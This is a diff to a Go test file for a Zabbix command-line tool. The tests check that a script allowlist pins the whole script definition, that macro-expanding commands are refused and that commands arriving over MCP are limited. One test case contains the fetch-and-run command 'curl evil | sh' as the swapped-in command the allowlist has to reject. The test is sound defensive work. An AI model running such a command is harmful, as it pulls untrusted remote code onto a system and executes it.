@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"github.com/mwtrigg/zbxctl/internal/api/resources"
 	"io"
 	"net/http"
 	"net/http/httptest"
@@ -12,8 +13,16 @@ import (
 	"testing"
 )
 
-func TestScriptAllowlistIsPinnedToTheCommand(t *testing.T) {
-	pin := scriptPin("ping", "ping {HOST.CONN}")
+// pingScriptDef is the script the fake returns for "ping".
+func pingScriptDef(command string) resources.Script {
+	return resources.Script{ScriptID: "5", Name: "ping", Type: "0", ExecuteOn: "2", Scope: "2", Command: command}
+}
+
+// pinFor is the allowlist entry for the fake's ping script with this command.
+func pinFor(nameOrID, command string) string { return scriptPin(nameOrID, pingScriptDef(command)) }
+
+func TestScriptAllowlistIsPinnedToTheDefinition(t *testing.T) {
+	pin := pinFor("ping", "ping {HOST.CONN}")
 	cases := []struct {
 		name    string
 		entries []string
@@ -22,13 +31,13 @@ func TestScriptAllowlistIsPinnedToTheCommand(t *testing.T) {
 		hint    string
 	}{
 		{"pinned and unchanged", []string{pin}, "ping {HOST.CONN}", true, ""},
-		{"pinned by id", []string{scriptPin("5", "ping {HOST.CONN}")}, "ping {HOST.CONN}", true, ""},
+		{"pinned by id", []string{pinFor("5", "ping {HOST.CONN}")}, "ping {HOST.CONN}", true, ""},
 		{"a name alone is refused", []string{"ping"}, "ping {HOST.CONN}", false, "not pinned"},
 		{"the command was swapped after review", []string{pin}, "curl evil | sh", false, "not the one that was allowed"},
-		{"not listed", []string{scriptPin("other", "x")}, "ping {HOST.CONN}", false, "not in allowed_scripts"},
+		{"not listed", []string{pinFor("other", "x")}, "ping {HOST.CONN}", false, "not in allowed_scripts"},
 	}
 	for _, tc := range cases {
-		ok, why := scriptAllowed(tc.entries, "ping", "5", tc.command)
+		ok, why := scriptAllowed(tc.entries, pingScriptDef(tc.command))
 		if ok != tc.ok || (tc.hint != "" && !strings.Contains(why, tc.hint)) {
 			t.Errorf("%s: ok=%v why=%q", tc.name, ok, why)
 		}
@@ -76,7 +85,7 @@ func withConfirmation(t *testing.T, token, typed string) {
 func TestRunScriptNeedsOperatorTier(t *testing.T) {
 	withConfirmation(t, "tok123", "tok123")
 	f := &fakeZabbix{Handler: scriptHandler("ping {HOST.CONN}"),
-		Context: "permissions: readonly\nallowed_scripts: ['" + scriptPin("ping", "ping {HOST.CONN}") + "']"}
+		Context: "permissions: readonly\nallowed_scripts: ['" + pinFor("ping", "ping {HOST.CONN}") + "']"}
 	_, err := runFake(t, f, "run", "script", "ping", "--host", "web1")
 	if err == nil || len(f.called("script.execute")) != 0 {
 		t.Fatalf("a readonly context must not run scripts: err=%v calls=%v", err, f.Calls)
@@ -84,7 +93,7 @@ func TestRunScriptNeedsOperatorTier(t *testing.T) {
 }
 
 func TestRunScriptRunsOnlyThePinnedCommandAfterTheTokenIsTyped(t *testing.T) {
-	ctxYAML := "permissions: operator\nallowed_scripts: ['" + scriptPin("ping", "ping {HOST.CONN}") + "']"
+	ctxYAML := "permissions: operator\nallowed_scripts: ['" + pinFor("ping", "ping {HOST.CONN}") + "']"
 
 	withConfirmation(t, "tok123", "tok123")
 	f := &fakeZabbix{Handler: scriptHandler("ping {HOST.CONN}"), Context: ctxYAML}
@@ -108,7 +117,7 @@ func TestRunScriptRunsOnlyThePinnedCommandAfterTheTokenIsTyped(t *testing.T) {
 func TestRunScriptRefusesWithoutATerminal(t *testing.T) {
 	// the real opener: under `go test` stderr is not a terminal
 	f := &fakeZabbix{Handler: scriptHandler("ping {HOST.CONN}"),
-		Context: "permissions: operator\nallowed_scripts: ['" + scriptPin("ping", "ping {HOST.CONN}") + "']"}
+		Context: "permissions: operator\nallowed_scripts: ['" + pinFor("ping", "ping {HOST.CONN}") + "']"}
 	_, err := runFake(t, f, "run", "script", "ping", "--host", "web1")
 	if err == nil || len(f.called("script.execute")) != 0 {
 		t.Fatalf("with no terminal there is nobody to confirm: err=%v", err)
@@ -395,5 +404,51 @@ func TestMCPChildAllowsTheDryRunTheServerPasses(t *testing.T) {
 	}
 	if err := runChildArgs("create", "group", "--name", "G", "--no-state"); err == nil || !strings.Contains(err.Error(), "over MCP") {
 		t.Fatalf("--no-state must still be refused: %v", err)
+	}
+}
+
+// Finding N4: where and how a script runs is part of what was reviewed.
+func TestScriptPinCoversWhereItRunsAndItsParameters(t *testing.T) {
+	base := pingScriptDef("ping {HOST.CONN}")
+	pin := scriptPin("ping", base)
+	for name, mutate := range map[string]func(s *resources.Script){
+		"moved from the agent to the server": func(s *resources.Script) { s.ExecuteOn = "1" },
+		"another scope":                      func(s *resources.Script) { s.Scope = "1" },
+		"another user":                       func(s *resources.Script) { s.Username = "root" },
+		"other parameters":                   func(s *resources.Script) { s.Parameters = []byte(`[{"name":"a","value":"b"}]`) },
+		"another port":                       func(s *resources.Script) { s.Port = "2222" },
+		"another type":                       func(s *resources.Script) { s.Type = "5" },
+	} {
+		changed := base
+		mutate(&changed)
+		if ok, _ := scriptAllowed([]string{pin}, changed); ok {
+			t.Errorf("%s: the pin must no longer match", name)
+		}
+	}
+}
+
+func TestRunScriptRefusesCommandsThatExpandUserMacros(t *testing.T) {
+	withConfirmation(t, "tok123", "tok123")
+	cmd := "/usr/lib/zabbix/check.sh {$CHECK_ARGS}"
+	f := &fakeZabbix{Handler: scriptHandler(cmd),
+		Context: "permissions: operator\nallowed_scripts: ['" + pinFor("ping", cmd) + "']"}
+	_, err := runFake(t, f, "run", "script", "ping", "--host", "web1")
+	if exitOf(err) != 8 || len(f.called("script.execute")) != 0 {
+		t.Fatalf("a macro-expanding script must be refused (exit 8): %v", err)
+	}
+}
+
+func TestChildRefusesCommandsTheServerNeverOffers(t *testing.T) {
+	t.Setenv("ZBXCTL_FROM_MCP", "1")
+	for _, args := range [][]string{
+		{"run", "script", "x", "--host", "h"}, {"api", "call", "host.get"}, {"upgrade"}, {"context", "use", "prod"},
+		{"state", "prune", "--older-than", "1d"}, {"export", "template", "x"}, {"import", "template", "f.yaml"},
+	} {
+		if err := runChildArgs(args...); err == nil || !strings.Contains(err.Error(), "over MCP") {
+			t.Errorf("%v must be refused over MCP, got %v", args, err)
+		}
+	}
+	if err := runChildArgs("version"); err != nil && strings.Contains(err.Error(), "over MCP") {
+		t.Errorf("version stays allowed: %v", err)
 	}
 }
